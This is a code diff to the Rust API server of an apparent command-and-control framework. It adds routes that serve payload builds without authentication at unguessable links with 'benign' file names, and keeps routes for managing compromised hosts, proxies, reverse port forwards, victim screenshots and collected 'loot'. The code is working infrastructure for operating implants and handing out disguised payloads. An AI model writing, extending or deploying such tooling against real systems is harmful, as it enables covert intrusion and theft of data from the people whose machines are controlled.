@@ -22,14 +22,11 @@ use crate::common::SharedSessions;
 use crate::config::config;
 use crate::database::DbPool;
 
-pub use state::{ApiContext, SharedResults, SharedProxies, SharedScripts, SharedListenerManager, SharedBuildJobs};
+pub use state::{ApiContext, SharedResults, SharedProxies, SharedListenerManager, SharedBuildJobs};
 use crate::api::routes::downloads;
 use crate::api::routes::iocs;
 use crate::api::routes::rcm;
-use crate::api::routes::{hosts, proxies, modules, extensions, history, operators, listeners, builder, topology, tasks};
-
-pub use state::SharedResults as ResultsType;
-pub use state::SharedProxies as ProxiesType;
+use crate::api::routes::{hosts, proxies, modules, extensions, history, operators, listeners, builder, topology, tasks, payloads};
 
 // ── Panel static file serving ──────────────────────────────────────────
 
@@ -96,18 +93,22 @@ pub async fn start_api_server(
     listener_mgr: SharedListenerManager,
     port: u16,
 ) {
-    let scripts: SharedScripts = Arc::new(Mutex::new(HashMap::new()));
     let shared_state = Arc::new(ApiContext {
         sessions,
         db,
         results,
         proxies,
-        scripts,
         listener_mgr,
         rportfwds:     Arc::new(Mutex::new(HashMap::new())),
         login_limiter: Arc::new(Mutex::new(HashMap::new())),
         build_jobs:    Arc::new(Mutex::new(HashMap::new())),
+        payload_links: Arc::new(Mutex::new(HashMap::new())),
+        dl_limiter:    Arc::new(Mutex::new(HashMap::new())),
     });
+
+    // Restore persisted /dl/<token>/<name> payload links so they survive
+    // server restarts (sidecar: dist/payload_links.json).
+    payloads::load_registry(&shared_state.payload_links);
 
     // The panel is served from this same API port, so the loopback origins
     // track the bound port (config.server.api_port by default).
@@ -133,18 +134,27 @@ pub async fn start_api_server(
     let public_routes = Router::new()
         .route("/", get(serve_panel))
         .route("/panel/*tail", get(serve_static))
-        .route("/api/auth/login", post(operators::login));
+        .route("/api/auth/login", post(operators::login))
+        // Randomized payload hosting: unguessable token + benign name serve
+        // the build artifact WITHOUT auth (per-IP rate limited in handler).
+        .route("/dl/:token/:name", get(payloads::serve_payload));
 
     // ── Protected routes (X-API-KEY header required) ───────────────────
     let protected_routes = Router::new()
         .route("/api/auth/me",                    get(operators::whoami))
+        .route("/api/auth/logout",                post(operators::logout))
+        .route("/api/auth/change_password",       post(operators::change_password))
         .route("/api/operators",                  get(operators::list).post(operators::create))
-        .route("/api/operators/:id",              delete(operators::delete))
+        .route("/api/operators/:name",            delete(operators::delete))
+        .route("/api/operators/:name/revoke",     post(operators::revoke_keys))
+        .route("/api/operators/:name/password",   post(operators::admin_reset_password))
         .route("/api/audit",                      get(operators::audit_log_handler))
         .route("/api/config/webhook",             get(operators::get_webhook).post(operators::set_webhook))
         .route("/api/config/recon",               get(operators::list_recon).post(operators::add_recon))
         .route("/api/config/recon/:id",           delete(operators::remove_recon))
+        .route("/api/server/c2-hints",            get(listeners::c2_hints))
         .route("/api/listeners",                  get(listeners::list).post(listeners::create))
+        .route("/api/listeners/profiles",         get(listeners::profiles))
         .route("/api/listeners/:id",              delete(listeners::delete))
         .route("/api/listeners/:id/start",        post(listeners::start))
         .route("/api/listeners/:id/stop",         post(listeners::stop))
@@ -173,8 +183,8 @@ pub async fn start_api_server(
         .route("/api/hosts/:id/proxy",            post(proxies::start_proxy).delete(proxies::stop_proxy))
         .route("/api/hosts/:id/proxy/check",      post(proxies::check_proxy_ip))
         .route("/api/hosts/:id/screenshots",       get(downloads::list_screenshots))
-        // Loot/screenshot file serving is AUTHENTICATED like everything else.
-        // The middleware's ?key= fallback covers <img>/<a href> panel uses.
+        // Loot/screenshot file serving is AUTHENTICATED via the X-API-KEY
+        // header only; query-string keys are not accepted.
         .route("/api/downloads/*path",             get(downloads::serve_download))
         .route("/api/loot",                       get(downloads::list_loot).delete(downloads::delete_loot))
         .route("/api/loot/zip",                   get(downloads::zip_loot))
